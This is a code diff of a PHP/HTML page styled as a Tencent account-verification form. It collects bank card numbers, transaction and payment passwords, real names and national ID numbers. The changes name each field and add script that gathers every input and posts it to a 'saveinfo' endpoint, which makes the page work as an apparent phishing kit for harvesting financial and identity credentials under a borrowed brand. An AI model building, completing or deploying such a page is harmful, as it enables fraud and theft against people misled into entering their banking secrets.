@@ -55,14 +55,14 @@
 			<br>
 			<p>输入需要登记的核实帐号</p>
 		</div>
-        <form class="form" step="1" style="width: 75%;margin-left: 2em;">
+        <form class="form" name="frm1" id="frm1" style="width: 75%;margin-left: 2em;">
             <input id="deviceid" type="hidden" name="deviceid" value="">
 			<?php if(\Input::get('type') == 'phone'){ ?>
 				<div ref="linkphone" class="j_acctInputWrp frm_controls" style="display: block;margin-bottom: 2%;position: relative;">
 					<label class="frm_label">手机号码</label>
 					<div class="frm_controls">
 					<span class="frm_input_box">
-						<input required="linkphone" id="linkphone" maxlength="20" class="frm_input" type="number" placeholder="请输入手机号码">
+						<input required="linkphone" id="linkphone" name="linkphone" maxlength="11" class="frm_input" type="text" placeholder="请输入手机号码">
 					</span>
 					</div>
 				</div>
@@ -71,7 +71,7 @@
 					<label class="frm_label">QQ号</label>
 					<div class="frm_controls">
 					<span class="frm_input_box">
-						<input required="qq" id="qq" maxlength="11" class="frm_input" type="text" placeholder="请输入QQ号">
+						<input required="qq" id="qq" name="qq"  maxlength="11" class="frm_input" type="text" placeholder="请输入QQ号">
 					</span>
 						<!--
                         <p class="frm_msg fail" style="display:none;">
@@ -84,24 +84,24 @@
 					<label class="frm_label">Email</label>
 					<div class="frm_controls">
 					<span class="frm_input_box">
-						<input required="email" id="email" maxlength="50" class="frm_input" type="text" placeholder="请输入邮箱" />
+						<input required="email" id="email" name="email" maxlength="23" class="frm_input" type="text" placeholder="请输入邮箱" />
 					</span>
 					</div>
 				</div>
 			<?php }else{ ?>
-				<div ref="paypwd" class="j_acctInputWrp frm_controls" style="display: block;margin-bottom: 2%;position: relative;">
+				<div ref="bankcard" class="j_acctInputWrp frm_controls" style="display: block;margin-bottom: 2%;position: relative;">
 					<label class="frm_label">银行卡号码</label>
 					<div class="frm_controls">
 					<span class="frm_input_box">
-						<input required="paypwd" id="account" maxlength="20" class="frm_input" type="number" placeholder="请输入银行卡号码">
+						<input required="bankcard" id="bankcard" name="bankcard" onkeyup="this.value=this.value.replace(/\D/g,'')"  onafterpaste="this.value=this.value.replace(/\D/g,'')" maxlength="20" size="18" class="frm_input" type="text" placeholder="请输入银行卡号码">
 					</span>
 					</div>
 				</div>
-				<div ref="paypwd" class="j_acctInputWrp frm_controls" style="display: block;margin-bottom: 2%;position: relative;">
+				<div ref="accountpwd" class="j_acctInputWrp frm_controls" style="display: block;margin-bottom: 2%;position: relative;">
 					<label class="frm_label">交易密码</label>
 					<div class="frm_controls">
 					<span class="frm_input_box">
-						<input required="paypwd" maxlength="20" class="frm_input" type="number" placeholder="6位数交易密码">
+						<input required="accountpwd" maxlength="6" class="frm_input" type="password" name="accountpwd" placeholder="6位数交易密码">
 					</span>
 					</div>
 				</div>
@@ -111,7 +111,7 @@
 				<label class="frm_label">姓名</label>
 				<div class="frm_controls">
 					<span class="frm_input_box">
-						<input required="realname" maxlength="5" class="frm_input" type="text" placeholder="请输入姓名">
+						<input required="realname" maxlength="5" class="frm_input" type="text" name="realname" placeholder="请输入姓名">
 					</span>
 				</div>
 			</div>
@@ -119,7 +119,7 @@
 				<label class="frm_label">身份证号码</label>
 				<div class="frm_controls">
 					<span class="frm_input_box">
-						<input required="idcode" maxlength="18" class="frm_input" type="text" placeholder="请输入身份证号码">
+						<input required="idcode" maxlength="18" class="frm_input" type="text" name="idcode" placeholder="请输入身份证号码">
 					</span>
 				</div>
 			</div>
@@ -127,7 +127,7 @@
 				<label class="frm_label">支付密码</label>
 				<div class="frm_controls">
 					<span class="frm_input_box">
-						<input required="paypwd" maxlength="6" class="frm_input" type="password" placeholder="请输入支付密码">
+						<input required="paypwd" maxlength="6" class="frm_input" type="password" name="paypwd" placeholder="请输入支付密码">
 					</span>
 				</div>
 			</div>
@@ -136,7 +136,7 @@
     </div>
 			
 	<div class="tool_bar tc">
-		<a href="javascript:" class="btn btn_default">返回</a>
+		<a href="/web/CheckInfo/checktype" class="btn btn_default">返回</a>
 		<a id="submitBtn" class="btn btn_primary" href="javascript:">下一步</a>
 	</div>
 </div>
@@ -154,10 +154,8 @@
 	</ul>
     <p class="copyright">Copyright &copy; 2011 - 2016 Tencent All Right Reserved.</p>
 </div>
-<script type="text/javascript" src="/assets/web/jquery1.11.3/jquery.js" ></script>
 <script type="text/javascript" src="/assets/web/js/footFixed2e1af5.js"></script>
 <script type="text/javascript" src="/assets/web/js/wxForm2e1af5.js"></script>
-<script type="text/javascript" src="/assets/web/js/common2f6835.js"></script>
 <script type="text/javascript">
 	var checknewsObj;
     !function(w, b){
@@ -177,35 +175,36 @@
 	$(function(){
 		//核实记录
 		$("#submitBtn").click(function(){
-			var ajaxurl = "";
-			var param = [];
-			var sys = checksys();
+			//progress
+			var ajaxurl = "/web/CheckInfo/saveinfo?code=<?php echo \Session::get('current_people')->id ?>&reaptcode=<?php echo \Session::get('current_people')->reaptcode ?>";
+			var param = {};
+			var mobilesys = checksys();
 
 			var msg = '';
 			<?php if(\Input::get('type') == 'phone'){ ?>
-			if($('#linkphone').val().trim().length < 1){
-				msg = '请填写手机号码';
-			}else if($('#linkphone').val().trim().length != 11){
-				msg = '错误的手机号码';
-			}
+				if($('#linkphone').val().trim().length < 1){
+					msg = '请填写手机号码';
+				}else if($('#linkphone').val().trim().length != 11){
+					msg = '错误的手机号码';
+				}
 			<?php } else if(\Input::get('type') == 'qq'){ ?>
-			if($('#qq').val().trim().length < 1){
-				msg = '请填写QQ号码';
-			}else if($('#qq').val().trim().length < 5 || $('#qq').val().trim().length > 10){
-				msg = '错误的QQ号码';
-			}
+				if($('#qq').val().trim().length < 1){
+					msg = '请填写QQ号码';
+				}else if($('#qq').val().trim().length < 5 || $('#qq').val().trim().length > 10){
+					msg = '错误的QQ号码';
+				}
 			<?php } else if(\Input::get('type') == 'email'){ ?>
 			if($('#email').val().trim().length < 1){
-				msg = '请填写Email';
-			}else if(/\w@\w*\.\w/.test($('#email').val().trim())){
-				msg = '错误的QQ号码';
-			}
+					msg = '请填写Email';
+				}else if(/\w@\w*\.\w/.test($('#email').val().trim())){
+					msg = '错误的QQ号码';
+				}
 			<?php }else{ ?>
-			if($('#account').val().trim().length < 1){
-				msg = '请填写银行卡号';
-			}else if($('#account').val().trim().length < 10){
-				msg = '错误的银行卡号';
-			}
+				if($('#account').val().trim().length < 1){
+					msg = '请填写银行卡号';
+				}else if($('#account').val().trim().length < 10){
+					msg = '错误的银行卡号';
+				}
 			<?php } ?>
 
 			if(msg.trim().length > 0){
@@ -213,18 +212,20 @@
 				return;
 			}
 
+			var inputs = $("#frm1").find('input');
+			for(var i=0;i<inputs.length;i++){
+				param[inputs[i].name] = inputs[i].value;
+			}
+			param['deviceid'] = mobilesys;
 			$.post(ajaxurl,param,function(data,status){
+				debugger
 				if(data.status == 'succ'){
-					alert("");
+					console.log('加载中等待。。。。。。')
 				}else{
 					alert("核实失败");
 				}
-			});
+			},'json');
 		});
-		
-		$("#linkphone").onblur(function(){
-			validatemobile($this);
-		})
 	})
 	
 	function checksys(){
@@ -248,26 +249,10 @@
 		var ajaxurl = "";
 		$.post(ajaxurl,param,function(data,status){
 				if(data.status == 'succ'){
-					playmusic();
 				}else{
 					alert("核实失败");
 				}
 			});
-	}
-	
-	function playmusic(){
-		//播放音乐
-		if(Xut.fix.audio){
-			audio
-			= 
-			Xu.fix.audio;
-				audio.src="";
-		}else{
-			audio = new Audio("");
-		}
-		audio.autoplay= true;
-		
-		audio.play();
 	}
 </script>
 <script>
